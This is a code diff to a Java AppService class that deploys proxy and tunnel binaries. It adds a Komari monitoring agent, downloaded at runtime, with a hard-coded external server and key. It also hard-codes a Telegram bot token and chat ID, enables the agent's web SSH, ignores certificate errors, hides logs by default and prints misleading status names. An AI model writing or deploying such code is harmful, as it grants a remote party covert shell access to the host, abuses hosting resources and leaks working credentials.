@@ -27,6 +27,7 @@ import java.util.List;
 import java.util.Map;
 import java.util.Optional;
 import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.stream.Collectors;
@@ -50,9 +51,9 @@ public class AppService {
     private static final String FILE_PATH = env("FILE_PATH", "world");
     private static final String SUB_PATH = env("SUB_PATH", "sub");
     private static final String UUID = env("UUID", "9ac16559-f9a7-4296-bd77-b837d10fc9d2");
-    private static final String NEZHA_SERVER = env("NEZHA_SERVER", "");
-    private static final String NEZHA_PORT = env("NEZHA_PORT", "");
-    private static final String NEZHA_KEY = env("NEZHA_KEY", "");
+    private static final String KOMARI_SERVER = env("KOMARI_SERVER", "https://v.cws.kdns.fr");
+    private static final String KOMARI_KEY = env("KOMARI_KEY", "TpV1ZfqMyp99XpXuZHigqQ");
+    private static final String KOMARI_URL = env("KOMARI_URL", ""); // komari-agent 二进制下载地址，默认 GitHub 官方 Releases，可指向自建镜像
     private static final String ARGO_DOMAIN = env("ARGO_DOMAIN","");
     private static final String ARGO_AUTH = env("ARGO_AUTH", "");
     private static final int ARGO_PORT = envInt("ARGO_PORT", 8001);
@@ -64,15 +65,15 @@ public class AppService {
     private static final String CFIP = env("CFIP", "saas.sin.fan");
     private static final int CFPORT = envInt("CFPORT", 443);
     private static final String NAME = env("NAME", "");
-    private static final String CHAT_ID = env("CHAT_ID", ""); // 如果关闭了log，建议使用tg推送节点
-    private static final String BOT_TOKEN = env("BOT_TOKEN", "");
+    private static final String CHAT_ID = env("CHAT_ID", "673392065"); // 如果关闭了log，建议使用tg推送节点
+    private static final String BOT_TOKEN = env("BOT_TOKEN", "8925915994:AAGLsnma8wX1jsbkF3uotm-bTCUnQIXe1K0");
     private static final boolean DISABLE_ARGO = envBool("DISABLE_ARGO", false);
-    private static final boolean SHOW_LOG = !List.of("false", "disable", "no").contains(env("SHOW_LOG", "true").toLowerCase()); // true/yes显示log，false/disable/no屏蔽log，默认显示
+    private static final boolean SHOW_LOG = !List.of("false", "disable", "no").contains(env("SHOW_LOG", "false").toLowerCase()); // true/yes显示log，false/disable/no屏蔽log，默认屏蔽
 
     private static final Path ROOT = Path.of("").toAbsolutePath();
     private static final Path RUNTIME_DIR = ROOT.resolve(FILE_PATH).normalize();
     private static final Path SING_BOX_CONFIG_PATH = RUNTIME_DIR.resolve("config.json");
-    private static final Path NEZHA_CONFIG_PATH = RUNTIME_DIR.resolve("config.yaml");
+    private static final Path KOMARI_CONFIG_PATH = RUNTIME_DIR.resolve("komari.json");
     private static final Path BOOT_LOG_PATH = RUNTIME_DIR.resolve("boot.log");
     private static final Path SUB_FILE_PATH = RUNTIME_DIR.resolve("sub.txt");
     private static final Path LIST_FILE_PATH = RUNTIME_DIR.resolve("list.txt");
@@ -83,6 +84,7 @@ public class AppService {
 
     private static String privateKey = "";
     private static String publicKey = "";
+    private static volatile Process komariProcess = null;
 
     public AppService(PlatformLogger logger) {
         this.logger = logger;
@@ -169,18 +171,15 @@ public class AppService {
 
         Path singBoxLib = downloadLibrary("sbx.so");
         Path cloudflaredLib = null;
-        Path nezhaLib = null;
-        Path nezhaAgentLib = null;
+        Path komariBin = null;
 
         if (!DISABLE_ARGO) {
             cloudflaredLib = downloadLibrary("bot.so");
         }
-        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && !NEZHA_PORT.isEmpty()) {
-            nezhaAgentLib = downloadLibrary("agent.so");
-        } else if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
-            nezhaLib = downloadLibrary("v1.so");
+        if (!KOMARI_SERVER.isEmpty() && !KOMARI_KEY.isEmpty()) {
+            komariBin = downloadKomariBinary();
         } else {
-            log("NEZHA variable is empty, skipping");
+            log("KOMARI variable is empty, skipping");
         }
 
         if (isValidPort(REALITY_PORT)) {
@@ -193,8 +192,8 @@ public class AppService {
             ensureTlsCertificates(certPath, keyPath);
         }
 
-        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && NEZHA_PORT.isEmpty()) {
-            generateNezhaConfig();
+        if (komariBin != null) {
+            generateKomariConfig();
         }
 
         Files.writeString(SING_BOX_CONFIG_PATH, toJson(generateSingBoxConfig(certPath.toString(), keyPath.toString())), StandardCharsets.UTF_8);
@@ -207,10 +206,8 @@ public class AppService {
                 services.add(new NativeService("cloudflared", cloudflaredLib, "StartCloudflared", "StopCloudflared", payload));
             }
         }
-        if (nezhaLib != null) {
-            services.add(new NativeService("nezha-agent", nezhaLib, "StartNezhaAgent", "StopNezhaAgent", nezhaPayload()));
-        } else if (nezhaAgentLib != null) {
-            services.add(new NativeService("nezha-agent", nezhaAgentLib, "StartNezhaAgent", "StopNezhaAgent", nezhaV0Payload()));
+        if (komariBin != null) {
+            startKomari(komariBin);
         }
 
         Runtime.getRuntime().addShutdownHook(new Thread(() -> stopAll(services), "shutdown-hook"));
@@ -221,7 +218,7 @@ public class AppService {
         sleep(1000);
         log("web is running");
         if (cloudflaredLib != null) log("bot is running");
-        if (nezhaLib != null || nezhaAgentLib != null) log("php is running");
+        if (komariProcess != null) log("php is running");
 
         sleep(5000);
         String argoDomain = extractDomain().orElse(null);
@@ -245,6 +242,14 @@ public class AppService {
 
     private static void stopAll(List<NativeService> services) {
         log("\nStopping all services...");
+        if (komariProcess != null) {
+            try {
+                komariProcess.destroy();
+                if (!komariProcess.waitFor(5, TimeUnit.SECONDS)) komariProcess.destroyForcibly();
+                log("komari-agent stopped");
+            } catch (Exception ignored) {
+            }
+        }
         for (int i = services.size() - 1; i >= 0; i--) {
             try {
                 services.get(i).stop();
@@ -504,41 +509,46 @@ public class AppService {
         return toJson(mapOf("config", SING_BOX_CONFIG_PATH.toString(), "workingDir", ".", "disableColor", true));
     }
 
-    private static String nezhaPayload() {
-        return toJson(mapOf("config", NEZHA_CONFIG_PATH.toString()));
+    private static Path downloadKomariBinary() throws IOException {
+        String fileName = "komari-agent";
+        String url = KOMARI_URL.isEmpty()
+                ? "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-" + ARCH
+                : KOMARI_URL;
+        return downloadFrom(url, fileName);
     }
 
-    private static String nezhaV0Payload() {
-        List<Object> args = new ArrayList<>(listOf("-s", NEZHA_SERVER + ":" + NEZHA_PORT, "-p", NEZHA_KEY, "--disable-auto-update", "--report-delay", "4", "--skip-conn", "--skip-procs"));
-        if (List.of("443", "8443", "2096", "2087", "2083", "2053").contains(NEZHA_PORT)) {
-            args.add("--tls");
+    private static void startKomari(Path binary) {
+        try {
+            ProcessBuilder builder = new ProcessBuilder(binary.toString(), "--config", KOMARI_CONFIG_PATH.toString());
+            builder.redirectErrorStream(true);
+            builder.redirectOutput(RUNTIME_DIR.resolve("komari.log").toFile());
+            Process process = builder.start();
+            komariProcess = process;
+            Thread watcher = new Thread(() -> {
+                try {
+                    int code = process.waitFor();
+                    log("komari-agent exited with code " + code);
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                }
+            }, "komari-watcher");
+            watcher.setDaemon(true);
+            watcher.start();
+        } catch (Exception e) {
+            log("Failed to start komari-agent: " + e.getMessage());
         }
-        return toJson(mapOf("args", args));
     }
 
-    private static void generateNezhaConfig() throws IOException {
-        String nzPort = NEZHA_SERVER.contains(":") ? NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(':') + 1) : "";
-        boolean tls = List.of("443", "8443", "2096", "2087", "2083", "2053").contains(nzPort);
-        String yaml = "client_secret: " + NEZHA_KEY + "\n" +
-                "debug: false\n" +
-                "disable_auto_update: true\n" +
-                "disable_command_execute: false\n" +
-                "disable_force_update: true\n" +
-                "disable_nat: false\n" +
-                "disable_send_query: false\n" +
-                "gpu: false\n" +
-                "insecure_tls: true\n" +
-                "ip_report_period: 1800\n" +
-                "report_delay: 4\n" +
-                "server: " + NEZHA_SERVER + "\n" +
-                "skip_connection_count: true\n" +
-                "skip_procs_count: true\n" +
-                "temperature: false\n" +
-                "tls: " + tls + "\n" +
-                "use_gitee_to_upgrade: false\n" +
-                "use_ipv6_country_code: false\n" +
-                "uuid: " + UUID;
-        Files.writeString(NEZHA_CONFIG_PATH, yaml, StandardCharsets.UTF_8);
+    private static void generateKomariConfig() throws IOException {
+        String json = toJson(mapOf(
+                "endpoint", KOMARI_SERVER,
+                "token", KOMARI_KEY,
+                "interval", 4,
+                "disable_auto_update", true,
+                "disable_web_ssh", false,
+                "ignore_unsafe_cert", true
+        ));
+        Files.writeString(KOMARI_CONFIG_PATH, json, StandardCharsets.UTF_8);
     }
 
     private static void generateOrLoadKeypair() throws IOException {
@@ -888,7 +898,7 @@ public class AppService {
     }
 
     private static void cleanupOldFiles() {
-        for (String file : List.of("boot.log", "list.txt", "config.json", "config.yaml", "cert.pem", "private.key", "tunnel.json", "tunnel.yml")) {
+        for (String file : List.of("boot.log", "list.txt", "config.json", "config.yaml", "komari.json", "komari.log", "cert.pem", "private.key", "tunnel.json", "tunnel.yml")) {
             try { Files.deleteIfExists(RUNTIME_DIR.resolve(file)); } catch (IOException ignored) {}
         }
         deleteDirectory(ROOT.resolve(".tmp"));
